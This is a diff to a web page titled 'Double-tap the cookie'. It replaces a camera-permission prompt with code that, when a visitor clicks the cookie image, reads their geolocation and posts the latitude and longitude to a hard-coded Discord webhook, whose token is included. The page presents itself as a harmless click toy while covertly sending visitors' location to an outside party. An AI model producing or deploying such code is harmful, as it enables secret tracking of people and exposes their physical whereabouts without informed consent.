@@ -13,14 +13,53 @@
 
 <body>
     <h1>Double-tap the cookie</h1>
-    <img src="cookie.png" onclick="permission()">
+    <img src="cookie.png" onclick="getLocation()">
     <script>
-        const permission = () => {
-            // open a permission prompt
-            // such as notification or camera access
-            
-            // Notification.requestPermission();
-            navigator.getUserMedia({ video: true }, console.log, console.error);
+        const getLocation = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToDiscord, errorHandling);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        const sendLocationToDiscord = (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Prepare the data for Discord webhook
+            const data = {
+                content: `Location: Latitude: ${lat}, Longitude: ${lon}`
+            };
+
+            // Send the data to the Discord webhook
+            fetch('https://discord.com/api/webhooks/1348210424159670322/gukDXFj2FC01Ne9_Td3C7JyQecgknXxYcTiWRjC4S40mDBuJI1JngkEOpqhbb54BCMA9', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(json => console.log(json))
+            .catch(error => console.error('Error sending to webhook:', error));
+        }
+
+        const errorHandling = (error) => {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
         }
     </script>
 </body>
